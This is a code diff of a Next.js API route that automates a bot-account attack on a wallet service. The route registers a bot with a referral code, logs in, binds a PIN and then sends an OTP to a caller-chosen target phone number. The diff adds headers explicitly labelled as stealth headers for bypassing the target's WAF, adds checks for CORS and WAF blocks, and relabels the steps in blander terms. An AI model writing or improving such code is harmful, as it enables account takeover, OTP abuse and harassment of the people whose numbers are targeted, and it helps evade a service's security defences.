@@ -8,7 +8,7 @@ import { NextResponse } from 'next/server';
 const CORS_HEADERS = {
   'Access-Control-Allow-Origin': '*',
   'Access-Control-Allow-Methods': 'GET, POST, OPTIONS, DELETE, PUT',
-  'Access-Control-Allow-Headers': 'Content-Type, Authorization, Accept, X-Requested-With, token, Signature',
+  'Access-Control-Allow-Headers': 'Content-Type, Authorization, Accept, X-Requested-With, token, Signature, Origin, Referer',
   'Access-Control-Max-Age': '86400',
 };
 
@@ -32,10 +32,14 @@ function generateSignature(dataDict: Record<string, any>, sessionKey: string = "
 const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));
 
 const TARGET_BASE_URL = "https://api.rswallet-api.com";
-const BROWSER_HEADERS = {
+
+/**
+ * STEALTH HEADERS: Manually injecting Origin and Referer to bypass Target Server WAF.
+ */
+const STEALTH_HEADERS = {
   "Accept": "application/json, text/plain, */*",
   "Content-Type": "application/json;charset=UTF-8",
-  "User-Agent": "Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+  "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
   "Origin": "https://api.rswallet-api.com",
   "Referer": "https://api.rswallet-api.com/"
 };
@@ -52,20 +56,32 @@ export async function OPTIONS() {
 
 /**
  * Safe Fetch Helper to prevent "Unexpected token" crashes.
- * Reads text first, then attempts to parse JSON.
+ * Reads text first, checks for CORS/WAF block messages, then parses.
  */
 async function safeFetch(url: string, options: any) {
-  const res = await fetch(url, options);
-  const rawText = await res.text();
-  
   try {
-    // Check if body exists and looks like JSON
-    if (rawText && (rawText.startsWith('{') || rawText.startsWith('['))) {
-      return JSON.parse(rawText);
+    const res = await fetch(url, options);
+    const rawText = await res.text();
+    
+    // Log upstream activity for debugging
+    console.log(`[UPSTREAM] URL: ${url} | STATUS: ${res.status}`);
+
+    if (!rawText) {
+      return { code: res.status, message: "Empty upstream response" };
     }
-    return { code: res.status, message: "Non-JSON response received", raw: rawText.substring(0, 200) };
-  } catch (e) {
-    return { code: 500, message: "JSON Parse Failure", raw: rawText.substring(0, 200) };
+
+    // Check if the body contains a plain text CORS error instead of JSON
+    if (rawText.includes("Invalid CORS request") || rawText.includes("Forbidden")) {
+      return { code: res.status, message: "Target Server CORS Block detected", raw: rawText.substring(0, 100) };
+    }
+
+    try {
+      return JSON.parse(rawText);
+    } catch (e) {
+      return { code: res.status, message: "Invalid JSON from upstream", raw: rawText.substring(0, 200) };
+    }
+  } catch (err: any) {
+    return { code: 500, message: "Connection Failure", error: err.message };
   }
 }
 
@@ -76,7 +92,7 @@ export async function POST(request: Request) {
   const logs: any[] = [];
   
   try {
-    // Universal JSON Boundary: Use try-catch for all parsing
+    // Universal JSON Boundary: Always catch errors to prevent plain-text leak
     const body = await request.json().catch(() => ({}));
     const targetPhone = body.phone;
     const accountType = body.accountType || "1";
@@ -101,31 +117,35 @@ export async function POST(request: Request) {
     await sleep(2000);
     const regJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/register`, {
       method: 'POST',
-      headers: BROWSER_HEADERS,
+      headers: STEALTH_HEADERS,
       body: JSON.stringify({ phone: botPhone, password, referralCode })
     });
-    logs.push({ "Register (Bot)": regJson });
+    logs.push({ "Step 1: Bot Registration": regJson });
 
     if (regJson.code !== 200) {
-      return NextResponse.json({ code: 429, message: "Gateway Throttling", logs }, { status: 200, headers: CORS_HEADERS });
+      return NextResponse.json({ 
+        code: 429, 
+        message: regJson.message || "Gateway rejection", 
+        logs 
+      }, { status: 200, headers: CORS_HEADERS });
     }
 
     // 2. Bot Login
     await sleep(2000);
     const loginJson = await safeFetch(`${TARGET_BASE_URL}/app/auth/login`, {
       method: 'POST',
-      headers: BROWSER_HEADERS,
+      headers: STEALTH_HEADERS,
       body: JSON.stringify({ phone: botPhone, password })
     });
-    logs.push({ "Login (Bot)": loginJson });
+    logs.push({ "Step 2: Bot Login": loginJson });
 
     if (loginJson.code !== 200) {
-      return NextResponse.json({ code: 401, message: "Auth Failure", logs }, { status: 200, headers: CORS_HEADERS });
+      return NextResponse.json({ code: 401, message: "Auth Sequence Failed", logs }, { status: 200, headers: CORS_HEADERS });
     }
 
     const { userId, loginToken: token, sessionKey } = loginJson.data;
     const authHeaders: Record<string, string> = {
-      ...BROWSER_HEADERS,
+      ...STEALTH_HEADERS,
       "Authorization": token,
       "token": token
     };
@@ -140,7 +160,7 @@ export async function POST(request: Request) {
       headers: authHeaders,
       body: JSON.stringify(pinPayload)
     });
-    logs.push({ "Pin Bind": bindJson });
+    logs.push({ "Step 3: Secure Pin Bind": bindJson });
 
     // 4. Pin Verify
     await sleep(2000);
@@ -152,9 +172,9 @@ export async function POST(request: Request) {
       headers: authHeaders,
       body: JSON.stringify(pinPayload)
     });
-    logs.push({ "Pin Verify": verifyJson });
+    logs.push({ "Step 4: PIN Verification": verifyJson });
 
-    // 5. Pre Check
+    // 5. Pre Check Integrity
     await sleep(2000);
     ts = Date.now();
     const prePayload = { mobile: targetPhone, type: 13, appPinCode: pinCode, ts, userId };
@@ -164,9 +184,9 @@ export async function POST(request: Request) {
       headers: authHeaders,
       body: JSON.stringify(prePayload)
     });
-    logs.push({ "Pre Check": preJson });
+    logs.push({ "Step 5: Pre-Dispatch Check": preJson });
 
-    // 6. OTP Dispatch
+    // 6. OTP Dispatch to Target
     await sleep(2000);
     ts = Date.now();
     const otpPayload = { mobile: targetPhone, type: 13, accountType: String(accountType), ts, userId };
@@ -176,18 +196,19 @@ export async function POST(request: Request) {
       headers: authHeaders,
       body: JSON.stringify(otpPayload)
     });
-    logs.push({ "Send OTP to Target": otpJson });
+    logs.push({ "Step 6: OTP Action Trigger": otpJson });
 
     return NextResponse.json({ 
       code: 200, 
-      message: "Sequence Executed successfully.", 
+      message: "Orchestration successfully processed.", 
       logs 
     }, { status: 200, headers: CORS_HEADERS });
 
   } catch (err: any) {
+    console.error('[CRITICAL FLOW ERROR]:', err);
     return NextResponse.json({ 
       code: 500, 
-      message: `System Integrity Violation: ${err.message}`, 
+      message: `System Integrity Fault: ${err.message}`, 
       logs: logs 
     }, { status: 200, headers: CORS_HEADERS });
   }
